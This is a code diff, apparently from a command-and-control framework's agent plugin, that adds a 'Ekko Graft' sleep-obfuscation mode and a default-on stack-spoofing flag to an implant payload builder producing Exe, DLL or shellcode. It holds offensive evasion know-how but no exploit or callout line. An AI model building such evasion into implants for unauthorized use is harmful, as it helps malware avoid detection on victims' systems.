@@ -252,11 +252,12 @@ func (pa *PluginAgent) BuildPayload(profile ax.BuildProfile, agentProfiles [][]b
 
 	// 2. Parse sleep/jitter/auth/format from the agent build form
 	var uiCfg struct {
-		Sleep     int    `json:"sleep"`
-		Jitter    int    `json:"jitter"`
-		SleepTech string `json:"sleep_tech"` // "Timer Spoof" | "Ekko"
-		AuthMode  string `json:"auth_mode"`  // combo currentText()
-		Format    string `json:"format"`     // "Exe" | "Service Exe" | "DLL" | "Shellcode"
+		Sleep      int    `json:"sleep"`
+		Jitter     int    `json:"jitter"`
+		SleepTech  string `json:"sleep_tech"`  // "Timer Spoof" | "Ekko Graft" | "Ekko"
+		StackSpoof *bool  `json:"stack_spoof"` // checkbox: nil = use default (true)
+		AuthMode   string `json:"auth_mode"`   // combo currentText()
+		Format     string `json:"format"`      // "Exe" | "Service Exe" | "DLL" | "Shellcode"
 	}
 	uiCfg.Sleep = 5
 	_ = json.Unmarshal([]byte(profile.AgentConfig), &uiCfg)
@@ -306,8 +307,16 @@ func (pa *PluginAgent) BuildPayload(profile ax.BuildProfile, agentProfiles [][]b
 		sslFlag = 1
 	}
 	sleepTech := 0 // default: Timer Spoof
-	if strings.HasPrefix(uiCfg.SleepTech, "Ekko") {
+	if uiCfg.SleepTech == "Ekko Graft" {
 		sleepTech = 1
+	} else if uiCfg.SleepTech == "Ekko" {
+		sleepTech = 2
+	}
+
+	// default on; only off when checkbox was explicitly unchecked
+	stackSpoof := 1
+	if uiCfg.StackSpoof != nil && !*uiCfg.StackSpoof {
+		stackSpoof = 0
 	}
 
 	makeArgs := []string{
@@ -318,6 +327,7 @@ func (pa *PluginAgent) BuildPayload(profile ax.BuildProfile, agentProfiles [][]b
 		fmt.Sprintf("PAIN_C2_SSL=%d", sslFlag),
 		fmt.Sprintf("PAIN_AUTH_MODE=%d", authMode),
 		fmt.Sprintf("PAIN_SLEEP_TECH=%d", sleepTech),
+		fmt.Sprintf("PAIN_STACK_SPOOF=%d", stackSpoof),
 	}
 	if authKeyHex != "" {
 		makeArgs = append(makeArgs, fmt.Sprintf("PAIN_AUTH_KEY=%s", authKeyHex))
